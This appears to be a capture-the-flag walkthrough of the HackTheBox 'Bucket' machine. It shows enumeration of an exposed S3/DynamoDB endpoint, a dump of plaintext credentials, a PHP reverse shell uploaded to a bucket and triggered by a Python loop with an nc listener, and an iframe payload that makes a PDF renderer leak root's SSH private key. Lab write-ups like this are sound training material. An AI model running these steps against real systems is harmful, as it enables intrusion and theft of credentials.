---
layout: post
title:  "HackTheBox - Bucket (User only)"
categories: [HackTheBox,walkthrough]
pin: true
tags: []
---

## Port Scan

```sh
┌──(alienum㉿kali)-[~]
└─$ sudo nmap -A -T4 10.10.10.212

Nmap scan report for 10.10.10.212 (10.10.10.212)
Host is up (0.35s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://bucket.htb/
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=4/24%OT=22%CT=1%CU=36383%PV=Y%DS=2%DC=T%G=Y%TM=608405D
OS:0%P=x86_64-pc-linux-gnu)SEQ(SP=FD%GCD=1%ISR=10E%TI=Z%CI=Z%TS=A)SEQ(SP=FD
OS:%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3=
OS:M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=FE88%W2=FE
OS:88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7
OS:%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=
OS:Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%
OS:RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0
OS:%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIP
OS:CK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 587/tcp)
HOP RTT       ADDRESS
1   372.67 ms 10.10.14.1 (10.10.14.1)
2   372.78 ms 10.10.10.212 (10.10.10.212)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.79 seconds
```


## Edit /etc/hosts

![image](/assets/img/bucket/1.PNG)

```
10.10.10.212    bucket.htb s3.bucket.htb
```

## Target : s3.bucket.htb

```sh
┌──(alienum㉿kali)-[~]
└─$ curl http://s3.bucket.htb/
{"status": "running"}  
```

#### Directory Scan

```sh
┌──(alienum㉿kali)-[~]
└─$ gobuster dir -k -u http://s3.bucket.htb  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://s3.bucket.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/04/24 14:58:24 Starting gobuster in directory enumeration mode
===============================================================
/health               (Status: 200) [Size: 54]
/shell                (Status: 200) [Size: 0]
^C
```

#### health

![image](/assets/img/bucket/2.PNG)

#### shell

Remember type  `/shell/` not `/shell`

![image](/assets/img/bucket/3.PNG)


## Amazon Web Services

Install the client ```sudo apt-get install awscli```

#### Enumeration aws | DynamoDB

*Configure*

```sh
┌──(alienum㉿kali)-[~]
└─$ aws configure                                      
AWS Access Key ID [****************lien]: alien
AWS Secret Access Key [****************lien]: alien
Default region name [eu]: eu
Default output format [text]: text
```

*List Tables*

```sh
┌──(alienum㉿kali)-[~]
└─$ aws dynamodb list-tables --endpoint-url http://s3.bucket.htb          
TABLENAMES	users
```

*Scan Table Name*

```sh
┌──(alienum㉿kali)-[~]
└─$ aws dynamodb scan --table-name users --endpoint-url http://s3.bucket.htb
None	3	3
PASSWORD	Management@#1@#
USERNAME	Mgmt
PASSWORD	Welcome123!
USERNAME	Cloudadm
PASSWORD	n2vM-<_K_Q:<REMOVED>
USERNAME	Sysadm
```

*Bucket Enumeration*

```sh
┌──(alienum㉿kali)-[~]
└─$ aws --endpoint-url http://s3.bucket.htb/ s3 ls
2021-04-24 15:21:04 adserver
```

- adserver enumeration
- rev_sh.php is not mine so maybe someone else working on the vm

```sh
┌──(alienum㉿kali)-[~]
└─$  aws --endpoint-url http://s3.bucket.htb/ s3 ls s3://adserver
                           PRE images/
2021-04-24 15:21:05       5344 index.html
2021-04-24 15:21:09       1071 rev_sh.php
```

*Upload Reverse Shell*

Create an automated script

```python
import os

os.system('whoami')
os.system('aws --endpoint-url http://s3.bucket.htb/ s3 cp /home/alienum/php/rev.php s3://adserver/rev.php')
print ('[+] rev.php should be uploaded')
while True:
  os.system('curl http://bucket.htb/rev.php &> /dev/null')
```

*Set Listener*

```
nc -lvp 4444
```

![image](/assets/img/bucket/4.PNG)


## SSH Credentials

```
roy : n2vM-<_K_Q:.<REMOVED>
```

## Privileges Escalation

Enumeration open ports

![image](/assets/img/bucket/5.PNG)

Port 8000 runs the `/var/www/bucket-app/index.php`

```php
roy@bucket:/var/www/bucket-app$ head -n 40 index.php
<?php
require 'vendor/autoload.php';
use Aws\DynamoDb\DynamoDbClient;
if($_SERVER["REQUEST_METHOD"]==="POST") {
	if($_POST["action"]==="get_alerts") {
		date_default_timezone_set('America/New_York');
		$client = new DynamoDbClient([
			'profile' => 'default',
			'region'  => 'us-east-1',
			'version' => 'latest',
			'endpoint' => 'http://localhost:4566'
		]);

		$iterator = $client->getIterator('Scan', array(
			'TableName' => 'alerts',
			'FilterExpression' => "title = :title",
			'ExpressionAttributeValues' => array(":title"=>array("S"=>"Ransomware")),
		));

		foreach ($iterator as $item) {
			$name=rand(1,10000).'.html';
			file_put_contents('files/'.$name,$item["data"]);
		}
		passthru("java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/$name 800 A4 -out files/result.pdf");
	}
}
else
{
?>


<!DOCTYPE html>
<html lang="en" >

<head>
  <meta charset="UTF-8">
  <title>We are not ready yet!</title>  
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css">

<style>
```


## Create table

```sh
┌──(alienum㉿kali)-[~]
└─$ aws dynamodb create-table \
    --table-name alerts \
    --attribute-definitions \
        AttributeName=title,AttributeType=S \
        AttributeName=data,AttributeType=S \                                                             
    --key-schema \
        AttributeName=title,KeyType=HASH \                              
        AttributeName=data,KeyType=RANGE \
--provisioned-throughput \
        ReadCapacityUnits=10,WriteCapacityUnits=5 --endpoint-url http://s3.bucket.htb
```

## Put item

```sh
┌──(alienum㉿kali)-[~]
└─$ aws dynamodb put-item \
    --table-name alerts \
    --item '{
        "title": {"S": "Ransomware"},
        "data": {"S": "<html><head></head><body><iframe src='/root/.ssh/id_rsa'></iframe></body></html>"}
      }' \
    --return-consumed-capacity TOTAL --endpoint-url http://s3.bucket.htb

CONSUMEDCAPACITY	1.0	alerts
```

## Curl
```sh
roy@bucket:/var/www/bucket-app/files$ curl --data "action=get_alerts" http://localhost:8000/
```

## Download the pdf

```sh
┌──(alienum㉿kali)-[~/Desktop]
└─$ scp roy@bucket.htb:/var/www/bucket-app/files/result.pdf ./
roy@bucket.htbs password:
result.pdf                                    100% 3869     8.3KB/s   00:00  
```

## All together

![image](/assets/img/bucket/6.PNG)

## The private key in the pdf

![image](/assets/img/bucket/7.PNG)

## Rooted

![image](/assets/img/bucket/8.PNG)
